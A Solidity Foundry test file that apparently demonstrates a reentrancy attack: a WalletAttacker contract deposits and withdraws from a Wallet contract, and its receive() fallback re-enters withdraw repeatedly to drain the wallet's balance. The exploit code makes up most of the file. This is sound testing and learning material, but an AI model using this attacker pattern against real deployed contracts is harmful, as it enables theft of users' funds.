// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test, console2} from "forge-std/Test.sol";
import {Wallet} from "../src/Wallet.sol";

contract WalletAttacker {
    Wallet public wallet;
    bool public asd;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
    }

    function attack() public {
        wallet.deposit{value: 1 ether}(address(this));
        wallet.withdraw(1 ether);
    }

    receive() external payable {
        if (address(wallet).balance >= 1 ether) {
            wallet.withdraw(1 ether);
        }
    }
}

contract WalletTest is Test {
    Wallet public wallet;
    WalletAttacker public bob;

    function setUp() public {
        wallet = new Wallet();
        bob = new WalletAttacker(wallet);
        console2.log("wallet address:", address(wallet));
        console2.log("attacker address:", address(bob));
        vm.deal(address(wallet), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testOne() public {
        //suppose we add bob

        assertEq(10 ether, address(wallet).balance);
        assertEq(1 ether, address(bob).balance);
        assertEq(0, wallet.balanceOf(address(bob)));

        // // bob.attack(10 ether);
        // // assertEq(0, address(wallet).balance);
        // assertEq(11 ether, address(wallet).balance);
        // assertEq(0, address(bob).balance);
        //bob.depositFirst(1 ether);
        bob.attack();
        console2.log("balance of wallet:", address(wallet).balance);
        console2.log("balance of bob:", address(bob).balance);
    }
}
